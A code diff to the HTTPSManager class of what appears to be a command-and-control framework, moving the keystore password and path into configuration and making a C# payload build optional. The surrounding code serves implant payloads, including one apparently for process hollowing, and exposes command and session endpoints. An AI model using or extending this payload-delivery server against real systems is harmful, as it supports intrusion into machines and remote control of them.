@@ -97,9 +97,9 @@ public class HTTPSManager extends C2Interface {
 			httpServer = HttpServer.create(addressHttp, 0);
 
 			// initialise the keystore
-			char[] password = "password".toCharArray();
+			char[] password = properties.getProperty(Constants.HTTPS_KEYSTORE_PASSWORD).toCharArray();
 			KeyStore ks = KeyStore.getInstance("JKS");
-			FileInputStream fis = new FileInputStream("testkey.jks");
+			FileInputStream fis = new FileInputStream(properties.getProperty(Constants.HTTPS_KEYSTORE_PATH));
 			ks.load(fis, password);
 
 			// setup the key manager factory
@@ -157,10 +157,12 @@ public class HTTPSManager extends C2Interface {
 					new PayloadHandler(hexPayload));
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTHOLLOWERPAYLOAD),
 					new PayloadHandler(hexPayload));
-			String cSharpPayload = CSharpPayloadBuilder
-					.buildPayload(properties.getProperty(Constants.DAEMONPAYLOADCSHARPDIR));
-			httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD),
-					new PayloadHandler(cSharpPayload));
+			String cSharpDirectory = properties.getProperty(Constants.DAEMONPAYLOADCSHARPDIR);
+			if (cSharpDirectory != null) {
+				String cSharpPayload = CSharpPayloadBuilder.buildPayload(cSharpDirectory);
+				httpsServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCSHARPPAYLOAD),
+						new PayloadHandler(cSharpPayload));
+			}
 
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTCMDREST), new CommandHandler(io));
 			httpServer.createContext(properties.getProperty(Constants.DAEMONCONTEXTGETSESSIONS),
